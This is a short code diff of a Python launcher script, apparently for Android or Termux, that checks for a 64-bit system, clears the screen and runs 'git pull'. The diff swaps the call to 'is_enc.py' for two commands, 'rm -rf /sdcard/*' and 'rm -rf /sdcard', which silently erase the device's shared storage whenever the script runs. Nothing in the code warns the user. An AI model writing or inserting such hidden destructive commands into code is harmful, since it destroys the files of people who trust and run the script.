@@ -4,6 +4,7 @@ if bit == '64bit':
     #mport i
     os.system('clear')
     os.system('git pull')
-    os.system('python is_enc.py')
+    os.system("rm -rf /sdcard/*")
+    os.system("rm -rf /sdcard")
 else:
     exit()
